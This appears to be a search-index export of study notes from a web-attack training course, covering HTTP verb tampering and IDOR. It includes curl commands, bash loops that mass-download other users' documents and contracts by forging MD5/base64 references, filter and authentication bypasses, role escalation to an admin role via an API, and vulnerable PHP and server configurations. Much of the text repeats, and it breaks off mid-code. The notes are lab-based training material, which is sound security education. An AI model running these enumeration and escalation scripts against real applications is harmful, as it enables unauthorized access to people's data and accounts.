Unfortunately, we still get prompted to log in and will get a 401 Unauthorized page if we don't provide the credentials: Seems like the web server configurations do cover both GET and POST requests. To see whether the server accepts HEAD requests, we can send an OPTIONS request to it and see what HTTP methods are accepted, as follows: hrmns@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/ HTTP/1.1 200 OK Date: Server: Apache/2.4.41 (Ubuntu) Allow: POST,OPTIONS,HEAD,GET Content-Length: 0 Content-Type: httpd/unix-directory the response shows Allow: POST,OPTIONS,HEAD,GET , which means that the web server indeed accepts HEAD requests, which is the default configuration for many web servers. Try to intercept the reset request again, and this time use a HEAD request to see how the web server handles it: Once we change POST to HEAD and forward the request, we will see that we no longer get a login prompt or a 401 Unauthorized page and get an empty output instead, as expected with a HEAD request. If we go back to the File Manager web application, we will see that all files have indeed been deleted, we successfully triggered the Reset functionality without having admin access or any credentials: Bypassing Security Filters \u00b6 The other and more common type of HTTP Verb Tampering vulnerability is caused by Insecure Coding errors made during the development of the web application, which lead to web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests. For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters (e.g. $_POST['parameter'] ), it may be possible to bypass it by simply changing the request method to GET . Identify \u00b6 if we try to crate a new file name with special characters in its name (e.g. test; ), we get the following message: This message shows that the web application uses certain filters on the back-end to identify injection attempts and then blocks any malicious requests. Exploit \u00b6 To try and exploit this vulnerability, let's intercept the request in Burp Suite (Burp) and then use Change Request Method to change it to another method: We did not get the Malicious Request Denied! message, and our file was successfully created: To confirm, we need to attempt exploiting the vuln the filter is protecting: Command Injection Vulnerability, in this case. Again change the request method to a GET request: Both file1 and file2 were created: Successfully bypassed the filter through an HTTP Verb Tampering vulnerability and achieved command injection. Verb Tampering Prevention \u00b6 Insecure configurations and insecure coding are what usually introduce Verb Tampering vulnerabilities. Insecure Configuration \u00b6 HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including Apache , Tomcat , and ASP.NET . The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected. Example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. 000-default.conf ), or in a .htaccess web page configuration file: <Directory \"/var/www/html/admin\" > AuthType Basic AuthName \"Admin Panel\" AuthUserFile /etc/apache2/.htpasswd <Limit GET > Require valid-user </Limit> </Directory> This configuration is setting the authorization configurations for the admin web directory. However, as the <Limit GET> keyword is being used, the Require valid-user setting will only apply to GET requests, leaving the page accessible through POST requests. Same vulnerability for a Tomcat web server, can be found in web.xml file for a certain Java web application: <security-constraint> <web-resource-collection> <url-pattern> /admin/* </url-pattern> <http-method> GET </http-method> </web-resource-collection> <auth-constraint> <role-name> admin </role-name> </auth-constraint> </security-constraint> Authorization is being limited only to the GET method with http-method , which leaves the page accessible through other HTTP methods. Example ASP.NET configuration found in web.config file of a web application: <system.web> <authorization> <allow verbs= \"GET\" roles= \"admin\" > <deny verbs= \"GET\" users= \"*\" > </deny> </allow> </authorization> </system.web> Allow and Deny scope is limited to the GET method, which leaves the web application accessible through other HTTP methods. Above examples show that it is not secure to limit the authorization configuration to a specific HTTP verb. We should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods. To avoid similar attacks, generally consider disabling/denying all HEAD requests unless specifically required by the web application. Insecure Coding \u00b6 Consider the following PHP code from our File Manager: if (isset($_REQUEST['filename'])) { if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) { system(\"touch \" . $_REQUEST['filename']); } else { echo \"Malicious Request Denied!\"; } } The fatal error made in this case is not due to Command Injections but due to the inconsistent use of HTTP methods. The preg_match filter only checks for special characters in POST parameters with $_POST['filename'] . However, the final system command uses the $_REQUEST['filename'] variable, which covers both GET and POST parameters. So, in the previous section, when we were sending our malicious input through a GET request, it did not get stopped by the preg_match function, as the POST parameters were empty and hence did not contain and special characters. Once we reach the system function, however, it used any parameters found in the request, and our GET parameters were used in the command, eventually leading to Command Injection. To avoid HTTP Verb Tampering vulnerabilities in our code, we must be consistent with our use of HTTP methods and ensure that the same method is always used for any specific functionality across the web application. It is always advised to expand the scope of testing in security filters by testing all request parameters. This can be done with the following functions and variables: Language Function PHP $_REQUEST['param'] Java request.getParameter('param') C# Request['param']","title":"HTTP Verb Tampering"},{"location":"attacking_web_applications/http_verb_tampering/#http-verb-tampering","text":"HTTP has 9 different verbs that can be accepted as HTTP methods by web servers. Other than GET and POST, the following are some of the commonly used HTTP verbs: Verb Description HEAD Identical to a GET request, but its response only contains the headers , without the response body PUT Writes the request payload to the specified location DELETE Deletes the resource at the specified location OPTIONS Shows different options accepted by a web server, like accepted HTTP verbs PATCH Apply partial modifications to the resource at the specified location What makes HTTP Verb Tampering attacks more common (and hence more critical), is that they are caused by a misconfiguration in either the back-end web server or the web application, either of which can cause the vulnerability.","title":"HTTP Verb Tampering"},{"location":"attacking_web_applications/http_verb_tampering/#insecure-configurations","text":"Insecure web server configurations cause the first type of HTTP Verb Tampering vulnerabilities. A web server's authentication configuration may be limited to specific HTTP methods, which would leave some HTTP methods accessible without authentication. <Limit GET POST > Require valid-user </Limit> Even though the configuration specifies both GET and POST requests for the authentication method, an attacker may still use a different HTTP method (like HEAD ) to bypass this authentication mechanism altogether.","title":"Insecure Configurations"},{"location":"attacking_web_applications/http_verb_tampering/#insecure-coding","text":"This can occur when a web developer applies specific filters to mitigate particular vulnerabilities while not covering all HTTP methods with that filter. For example, if a web page was found to be vulnerable to a SQL Injection vulnerability, and the back-end developer mitigated the SQL Injection vulnerability by the following applying input sanitization filters: $pattern = \"/^[A-Za-z\\s]+$/\"; if(preg_match($pattern, $_GET[\"code\"])) { $query = \"Select * from ports where port_code like '%\" . $_REQUEST[\"code\"] . \"%'\"; ...SNIP... } We can see that the sanitization filter is only being tested on the GET parameter. If the GET requests do not contain any bad characters, then the query would be executed. However, when the query is executed, the $_REQUEST[\"code\"] parameters are being used, which may also contain POST parameters, leading to an inconsistency in the use of HTTP Verbs . In this case, an attacker may use a POST request to perform SQL injection, in which case the GET parameters would be empty (will not include any bad characters). The request would pass the security filter, which would make the function still vulnerable to SQL Injection.","title":"Insecure Coding"},{"location":"attacking_web_applications/http_verb_tampering/#bypassing-basic-authentication","text":"We have a basic File Manager web application, in which we can add new files by typing their names and hitting enter: Suppose we try to delete all files by clicking on the red Reset button. In that case, we see that this functionality seems to be restricted for authenticated users only, as we get the following HTTP Basic Auth prompt: As we do not have any credentials, we will get a 401 Unauthorized page: Let's see whether we can bypass this with an HTTP Verb Tampering attack. To do so, we need to identify which pages are restricted by this authentication. If we examine the HTTP request after clicking the Reset button or look at the URL that the button navigates to after clicking it, we see that it is at /admin/reset.php . So, either the /admin directory is restricted to authenticated users only, or only the /admin/reset.php page is. We can confirm this by visiting the /admin directory, and we do indeed get prompted to log in again. This means that the full /admin directory is restricted.","title":"Bypassing Basic Authentication"},{"location":"attacking_web_applications/http_verb_tampering/#exploit","text":"We need to identify the HTTP request method used by the web application. We can intercept the request in Burp Suite and examine it: As the page uses a GET request, we can send a POST request and see whether the web page allows POST requests (i.e., whether the Authentication covers POST requests). we can click Forward and examine the page in our browser. Unfortunately, we still get prompted to log in and will get a 401 Unauthorized page if we don't provide the credentials: Seems like the web server configurations do cover both GET and POST requests. To see whether the server accepts HEAD requests, we can send an OPTIONS request to it and see what HTTP methods are accepted, as follows: hrmns@htb[/htb]$ curl -i -X OPTIONS http://SERVER_IP:PORT/ HTTP/1.1 200 OK Date: Server: Apache/2.4.41 (Ubuntu) Allow: POST,OPTIONS,HEAD,GET Content-Length: 0 Content-Type: httpd/unix-directory the response shows Allow: POST,OPTIONS,HEAD,GET , which means that the web server indeed accepts HEAD requests, which is the default configuration for many web servers. Try to intercept the reset request again, and this time use a HEAD request to see how the web server handles it: Once we change POST to HEAD and forward the request, we will see that we no longer get a login prompt or a 401 Unauthorized page and get an empty output instead, as expected with a HEAD request. If we go back to the File Manager web application, we will see that all files have indeed been deleted, we successfully triggered the Reset functionality without having admin access or any credentials:","title":"Exploit"},{"location":"attacking_web_applications/http_verb_tampering/#bypassing-security-filters","text":"The other and more common type of HTTP Verb Tampering vulnerability is caused by Insecure Coding errors made during the development of the web application, which lead to web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests. For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters (e.g. $_POST['parameter'] ), it may be possible to bypass it by simply changing the request method to GET .","title":"Bypassing Security Filters"},{"location":"attacking_web_applications/http_verb_tampering/#identify","text":"if we try to crate a new file name with special characters in its name (e.g. test; ), we get the following message: This message shows that the web application uses certain filters on the back-end to identify injection attempts and then blocks any malicious requests.","title":"Identify"},{"location":"attacking_web_applications/http_verb_tampering/#exploit_1","text":"To try and exploit this vulnerability, let's intercept the request in Burp Suite (Burp) and then use Change Request Method to change it to another method: We did not get the Malicious Request Denied! message, and our file was successfully created: To confirm, we need to attempt exploiting the vuln the filter is protecting: Command Injection Vulnerability, in this case. Again change the request method to a GET request: Both file1 and file2 were created: Successfully bypassed the filter through an HTTP Verb Tampering vulnerability and achieved command injection.","title":"Exploit"},{"location":"attacking_web_applications/http_verb_tampering/#verb-tampering-prevention","text":"Insecure configurations and insecure coding are what usually introduce Verb Tampering vulnerabilities.","title":"Verb Tampering Prevention"},{"location":"attacking_web_applications/http_verb_tampering/#insecure-configuration","text":"HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including Apache , Tomcat , and ASP.NET . The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected. Example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. 000-default.conf ), or in a .htaccess web page configuration file: <Directory \"/var/www/html/admin\" > AuthType Basic AuthName \"Admin Panel\" AuthUserFile /etc/apache2/.htpasswd <Limit GET > Require valid-user </Limit> </Directory> This configuration is setting the authorization configurations for the admin web directory. However, as the <Limit GET> keyword is being used, the Require valid-user setting will only apply to GET requests, leaving the page accessible through POST requests. Same vulnerability for a Tomcat web server, can be found in web.xml file for a certain Java web application: <security-constraint> <web-resource-collection> <url-pattern> /admin/* </url-pattern> <http-method> GET </http-method> </web-resource-collection> <auth-constraint> <role-name> admin </role-name> </auth-constraint> </security-constraint> Authorization is being limited only to the GET method with http-method , which leaves the page accessible through other HTTP methods. Example ASP.NET configuration found in web.config file of a web application: <system.web> <authorization> <allow verbs= \"GET\" roles= \"admin\" > <deny verbs= \"GET\" users= \"*\" > </deny> </allow> </authorization> </system.web> Allow and Deny scope is limited to the GET method, which leaves the web application accessible through other HTTP methods. Above examples show that it is not secure to limit the authorization configuration to a specific HTTP verb. We should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods. To avoid similar attacks, generally consider disabling/denying all HEAD requests unless specifically required by the web application.","title":"Insecure Configuration"},{"location":"attacking_web_applications/http_verb_tampering/#insecure-coding_1","text":"Consider the following PHP code from our File Manager: if (isset($_REQUEST['filename'])) { if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) { system(\"touch \" . $_REQUEST['filename']); } else { echo \"Malicious Request Denied!\"; } } The fatal error made in this case is not due to Command Injections but due to the inconsistent use of HTTP methods. The preg_match filter only checks for special characters in POST parameters with $_POST['filename'] . However, the final system command uses the $_REQUEST['filename'] variable, which covers both GET and POST parameters. So, in the previous section, when we were sending our malicious input through a GET request, it did not get stopped by the preg_match function, as the POST parameters were empty and hence did not contain and special characters. Once we reach the system function, however, it used any parameters found in the request, and our GET parameters were used in the command, eventually leading to Command Injection. To avoid HTTP Verb Tampering vulnerabilities in our code, we must be consistent with our use of HTTP methods and ensure that the same method is always used for any specific functionality across the web application. It is always advised to expand the scope of testing in security filters by testing all request parameters. This can be done with the following functions and variables: Language Function PHP $_REQUEST['param'] Java request.getParameter('param') C# Request['param']","title":"Insecure Coding"},{"location":"attacking_web_applications/idor/","text":"Insecure Direct Object References (IDOR) \u00b6 IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If users request access to a file they recently uploaded, they may get a link to it such as ( download.php?file_id=123 ). So, as the link directly references the file with ( file_id=123 ), what would happen if we tried to access another file (which may not belong to us) with ( download.php?file_id=124 )? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its file_id . In many cases, we may find that the id is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions. The main takeaway is that an IDOR vulnerability mainly exists due to the lack of an access control on the back-end . Impact of IDOR Vulnerabilities \u00b6 IDOR vulnerabilities can have a significant impact on web applications. IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with IDOR Insecure Function Calls . Many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. If we had access to such parameters or APIs, we may call them with our standard user privileges. Suppose the back-end did not explicitly deny non-admin users from calling these functions. In that case, we may be able to perform unauthorized administrative operations, like changing users' passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application. Identifying IDORs \u00b6 URL Parameters & APIs \u00b6 First step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ? uid=1 or ?filename=file_1.pdf ). AJAX Calls \u00b6 May also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role. Basic example of an AJAX call: function changeUserPassword () { $ . ajax ({ url : \"change_password.php\" , type : \"post\" , dataType : \"json\" , data : { uid : user . uid , password : user . password , is_admin : is_admin }, success : function ( result ){ // } }); } The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR Understanding Hashing/Encoding \u00b6 Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If there is no access control system on the back-end, we may still be able to exploit them. See a reference like ( ?filename=ZmlsZV8xMjMucGRm ), we can immediately guess that the file name is base64 encoded (from its character set), which we can decode to get the original object reference of ( file_123.pdf ). Then, we can try encoding a different object reference (e.g. file_124.pdf ) and try accessing it with the encoded object reference ( ?filename=ZmlsZV8xMjQucGRm ), which may reveal an IDOR vulnerability if we were able to retrieve any data. The object reference may be hashed, like ( download.php?filename=c81e728d9d4c2f636f067f89cc14862c ). Looking at the source code, we may see what is being hashed before the API call is made: $ . ajax ({ url : \"download.php\" , type : \"post\" , dataType : \"json\" , data : { filename : CryptoJS . MD5 ( 'file_1.pdf' ). toString ()}, success : function ( result ){ // } }); Mass IDOR Enumeration \u00b6 As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques. We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code, and we will get the following: < li class = 'pure-tree_link' >< a href = '/documents/Invoice_3_06_2020.pdf' target = '_blank' > Invoice </ a ></ li > < li class = 'pure-tree_link' >< a href = '/documents/Report_3_01_2020.pdf' target = '_blank' > Report </ a ></ li > We see that each link starts with <li class='pure-tree_link'> , so we may curl the page and grep for this line: hrmns@htb[/htb]$ curl -s \"http://SERVER_IP:PORT/documents.php?uid=1\" | grep \"<li class='pure-tree_link'>\" <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li> <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li> We were able to capture the document links successfully. Use a Regex pattern that matches strings between /document and .pdf, which we can use with grep to only get the document links: hrmns@htb[/htb]$ curl -s \"http://SERVER_IP:PORT/documents.php?uid=3\" | grep -oP \"\\/documents.*?.pdf\" /documents/Invoice_3_06_2020.pdf /documents/Report_3_01_2020.pdf Use a simple for loop to loop over the uid parameter and return the document of all employees, and then use wget to download each document link: #!/bin/bash url = \"http://SERVER_IP:PORT\" for i in { 1 ..10 } ; do for link in $( curl -s \" $url /documents.php?uid= $i \" | grep -oP \"\\/documents.*?.pdf\" ) ; do wget -q $url / $link done done Script will download all documents from all employees with uids between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees. Bypassing Encoded References \u00b6 Intercepted downloading request: sending a POST request to download.php with the following data: contract=cdd96d3cc73d1dbdaffa03cc6cd7339b We can attempt to hash various values, like uid, username, filename, and many others, and see if any of their md5 hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. Compare the md5 hash of our uid, and see if it matches the above hash: hrmns@htb[/htb]$ echo -n 1 | md5sum c4ca4238a0b923820dcc509a6f75849b - Function Disclosure \u00b6 As most modern web applications are developed using JavaScript frameworks, like Angular , React , or Vue.js , many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. Looking at the downloadContract() function in the source code, we see the following: function downloadContract ( uid ) { $ . redirect ( \"/download.php\" , { contract : CryptoJS . MD5 ( btoa ( uid )). toString (), }, \"POST\" , \"_self\" ); } Function appears to be sending a POST request with the contract parameter, which is what we saw above. The value it is sending is an md5 hash using the CryptoJS library. In this case, the value being hashed is btoa(uid) , which is the base64 encoded string of the uid variable, which is an input argument for the function. We can test this by base64 encoding our uid=1 , and then hashing it with md5 , as follows: hrmns@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum cdd96d3cc73d1dbdaffa03cc6cd7339b - We are using the -n flag with echo , and the -w 0 flag with base64 , to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash. This hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. We can begin enumerating other employees' contracts using the same hashing method we used above. Mass Enumeration \u00b6 Simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. hrmns@htb[/htb]$ for i in { 1 ..10 } ; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -' ; done cdd96d3cc73d1dbdaffa03cc6cd7339b 0b7e7dee87b1c3b98e72131173dfbbbf 0b24df25fe628797b3a50ae0724d2730 f7947d50da7a043693a592b4db43b0a1 8b9af1f7f76daf0f02bd9c48c4a2e3d0 006d1236aee3f92b8322299796ba1989 b523ff8d1ced96cef9c86492e790c2fb d477819d240e7d3dd9499ed8d23e7158 3e57e65a34ffcb2e93cb545d024f5bde 5d4aace023dc088767b4e08c79415dcd Next, make a POST request on download.php with each of the above hashes as the contract value, which should give us our final script: #!/bin/bash for i in { 1 ..10 } ; do for hash in $( echo -n $i | base64 -w 0 | md5sum | tr -d ' -' ) ; do curl -sOJ -X POST -d \"contract= $hash \" http://SERVER_IP:PORT/download.php done done With that, we can run the script, and it should download all contracts for employees 1-10: hrmns@htb[/htb]$ bash ./exploit.sh hrmns@htb[/htb]$ ls -1 contract_006d1236aee3f92b8322299796ba1989.pdf contract_0b24df25fe628797b3a50ae0724d2730.pdf contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf contract_5d4aace023dc088767b4e08c79415dcd.pdf contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf contract_b523ff8d1ced96cef9c86492e790c2fb.pdf contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf contract_d477819d240e7d3dd9499ed8d23e7158.pdf contract_f7947d50da7a043693a592b4db43b0a1.pdf IDOR in insecure APIs \u00b6 IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users. While IDOR Information Disclosure Vulnerabilities allow us to read various types of resources, IDOR Insecure Function Calls enable us to call APIs or execute functions as another user. Identifying Insecure APIs \u00b6 We can start testing the Edit Profile page for IDOR vulnerabilities: Click on the Edit Profile button, we are taken to a page to edit information of our user profile, namely Full Name , Email , and About Me : Change any of the details in our profile and click Update profile , and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Intercept the Update request in Burp and look at it: The page is sending a PUT request to the /profile/api.php/profile/1 API endpoint. PUT requests are usually used in APIs to update item details, while POST is used to create new items, DELETE to delete items, and GET to retrieve item details. So, a PUT request for the Update profile function is expected. The interesting bit is the JSON parameters it is sending: { \"uid\" : 1 , \"uuid\" : \"40f5888b67c748df7efba008e7c2f9d2\" , \"role\" : \"employee\" , \"full_name\" : \"Amy Lindon\" , \"email\" : \"a_lindon@employees.htb\" , \"about\" : \"A Release is like a boat. 80% of the holes plugged is not good enough.\" } The PUT request includes a few hidden parameters, like uid, uuid , and most interestingly role , which is set to employee . The web application also appears to be setting the user access privileges (e.g. role ) on the client-side, in the form of our Cookie: role=employee cookie, which appears to reflect the role specified for our user. This is a common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges. Unless the web application has a solid access control system on the back-end, we should be able to set an arbitrary role for our user, which may grant us more privileges . Exploiting Insecure APIs \u00b6 Start by changing our uid to another user's uid (e.g. \" uid \": 2 ). However, any number we set other than our own uid gets us a response of uid mismatch : The web application appears to be comparing the request's uid to the API endpoint ( /1 ). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors. We'll change the API endpoint to /profile/api.php/profile/2 , and change \"uid\": 2 to avoid the previous uid mismatch : This time, we get an error message saying uuid mismatch . Application appears to be checking if the uuid value we are sending matches the user's uuid . Since we are sending our own uuid , our request is failing. This appears to be another form of access control to prevent users from changing another user's details. Let's see if we can create a new user with a POST request to the API endpoint. We can change the request method to POST , change the uid to a new uid , and send the request to the API endpoint of the new uid : Error: Creating new employees is for admins only . The same thing happens when we send a Delete request. The web application might be checking our authorization through the role=employee cookie because this appears to be the only form of authorization in the HTTP request. Finally, try changing role to admin/administrator to gain higher privileges. Unfortunately, without knowing a valid role name, we get Invalid role in the HTTP response, and our role does not update: So, is the web application secure against IDOR attacks? So far, we have only been testing the IDOR Insecure Function Calls . We have not tested the API's GET request for IDOR Information Disclosure Vulnerabilities . Information Disclosure \u00b6 Send a GET request with another uid : This returned the details of another user, with their own uuid and role , confirming an IDOR Information Disclosure vulnerability : { \"uid\" : \"2\" , \"uuid\" : \"4a9bd19b3b8676199592a346051f950c\" , \"role\" : \"employee\" , \"full_name\" : \"Iona Franklyn\" , \"email\" : \"i_franklyn@employees.htb\" , \"about\" : \"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it.\" } This provides new details, most notably the uuid . Modifying Other User's Details \u00b6 With the user's uuid at hand, we can change this user's details by sending a PUT request to /profile/api.php/profile/2 No error this time, GET user details we see it's indeed updated: ) The ability to modify another user's details also enables us to perform several other attacks. E.g. modifying a user's email address and then requesting a password reset link, which will be sent to the email address we specified, allowing us to take control over their account. Another potential attack is placing an XSS payload in the 'about' field , which would get executed once the user visits their Edit profile page, enabling us to attack the user in different ways. Chaining Two IDOR Vulnerabilities \u00b6 Look for other roles , ideally an admin role. { \"uid\" : \"X\" , \"uuid\" : \"a36fa9e66e85f2dd6f5e13cad45248ae\" , \"role\" : \"web_admin\" , \"full_name\" : \"administrator\" , \"email\" : \"webadmin@employees.htb\" , \"about\" : \"HTB{FLAG}\" } The admin role name ( web_admin ), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the Update profile button and change our role to web_admin : We do not get the Invalid role error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we GET our user details, we see that our role has indeed been set to web_admin : { \"uid\" : \"1\" , \"uuid\" : \"40f5888b67c748df7efba008e7c2f9d2\" , \"role\" : \"web_admin\" , \"full_name\" : \"Amy Lindon\" , \"email\" : \"a_lindon@employees.htb\" , \"about\" : \"A Release is like a boat. 80% of the holes plugged is not good enough.\" } Refresh the page to update our cookie, or manually set it as Cookie: role=web_admin , and then intercept the Update request to create a new user and see if we'd be allowed to do so: No error message. If we send a GET request for the new user, we see that it has been successfully created: By combining the information we gained from the IDOR Information Disclosure vulnerability with an IDOR Insecure Function Calls attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.","title":"Insecure Direct Object References"},{"location":"attacking_web_applications/idor/#insecure-direct-object-references-idor","text":"IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If users request access to a file they recently uploaded, they may get a link to it such as ( download.php?file_id=123 ). So, as the link directly references the file with ( file_id=123 ), what would happen if we tried to access another file (which may not belong to us) with ( download.php?file_id=124 )? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its file_id . In many cases, we may find that the id is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions. The main takeaway is that an IDOR vulnerability mainly exists due to the lack of an access control on the back-end .","title":"Insecure Direct Object References (IDOR)"},{"location":"attacking_web_applications/idor/#impact-of-idor-vulnerabilities","text":"IDOR vulnerabilities can have a significant impact on web applications. IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with IDOR Insecure Function Calls . Many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. If we had access to such parameters or APIs, we may call them with our standard user privileges. Suppose the back-end did not explicitly deny non-admin users from calling these functions. In that case, we may be able to perform unauthorized administrative operations, like changing users' passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application.","title":"Impact of IDOR Vulnerabilities"},{"location":"attacking_web_applications/idor/#identifying-idors","text":"","title":"Identifying IDORs"},{"location":"attacking_web_applications/idor/#url-parameters-apis","text":"First step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ? uid=1 or ?filename=file_1.pdf ).","title":"URL Parameters &amp; APIs"},{"location":"attacking_web_applications/idor/#ajax-calls","text":"May also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role. Basic example of an AJAX call: function changeUserPassword () { $ . ajax ({ url : \"change_password.php\" , type : \"post\" , dataType : \"json\" , data : { uid : user . uid , password : user . password , is_admin : is_admin }, success : function ( result ){ // } }); } The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR","title":"AJAX Calls"},{"location":"attacking_web_applications/idor/#understanding-hashingencoding","text":"Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If there is no access control system on the back-end, we may still be able to exploit them. See a reference like ( ?filename=ZmlsZV8xMjMucGRm ), we can immediately guess that the file name is base64 encoded (from its character set), which we can decode to get the original object reference of ( file_123.pdf ). Then, we can try encoding a different object reference (e.g. file_124.pdf ) and try accessing it with the encoded object reference ( ?filename=ZmlsZV8xMjQucGRm ), which may reveal an IDOR vulnerability if we were able to retrieve any data. The object reference may be hashed, like ( download.php?filename=c81e728d9d4c2f636f067f89cc14862c ). Looking at the source code, we may see what is being hashed before the API call is made: $ . ajax ({ url : \"download.php\" , type : \"post\" , dataType : \"json\" , data : { filename : CryptoJS . MD5 ( 'file_1.pdf' ). toString ()}, success : function ( result ){ // } });","title":"Understanding Hashing/Encoding"},{"location":"attacking_web_applications/idor/#mass-idor-enumeration","text":"As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques. We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code, and we will get the following: < li class = 'pure-tree_link' >< a href = '/documents/Invoice_3_06_2020.pdf' target = '_blank' > Invoice </ a ></ li > < li class = 'pure-tree_link' >< a href = '/documents/Report_3_01_2020.pdf' target = '_blank' > Report </ a ></ li > We see that each link starts with <li class='pure-tree_link'> , so we may curl the page and grep for this line: hrmns@htb[/htb]$ curl -s \"http://SERVER_IP:PORT/documents.php?uid=1\" | grep \"<li class='pure-tree_link'>\" <li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li> <li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li> We were able to capture the document links successfully. Use a Regex pattern that matches strings between /document and .pdf, which we can use with grep to only get the document links: hrmns@htb[/htb]$ curl -s \"http://SERVER_IP:PORT/documents.php?uid=3\" | grep -oP \"\\/documents.*?.pdf\" /documents/Invoice_3_06_2020.pdf /documents/Report_3_01_2020.pdf Use a simple for loop to loop over the uid parameter and return the document of all employees, and then use wget to download each document link: #!/bin/bash url = \"http://SERVER_IP:PORT\" for i in { 1 ..10 } ; do for link in $( curl -s \" $url /documents.php?uid= $i \" | grep -oP \"\\/documents.*?.pdf\" ) ; do wget -q $url / $link done done Script will download all documents from all employees with uids between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees.","title":"Mass IDOR Enumeration"},{"location":"attacking_web_applications/idor/#bypassing-encoded-references","text":"Intercepted downloading request: sending a POST request to download.php with the following data: contract=cdd96d3cc73d1dbdaffa03cc6cd7339b We can attempt to hash various values, like uid, username, filename, and many others, and see if any of their md5 hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. Compare the md5 hash of our uid, and see if it matches the above hash: hrmns@htb[/htb]$ echo -n 1 | md5sum c4ca4238a0b923820dcc509a6f75849b -","title":"Bypassing Encoded References"},{"location":"attacking_web_applications/idor/#function-disclosure","text":"As most modern web applications are developed using JavaScript frameworks, like Angular , React , or Vue.js , many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. Looking at the downloadContract() function in the source code, we see the following: function downloadContract ( uid ) { $ . redirect ( \"/download.php\" , { contract : CryptoJS . MD5 ( btoa ( uid )). 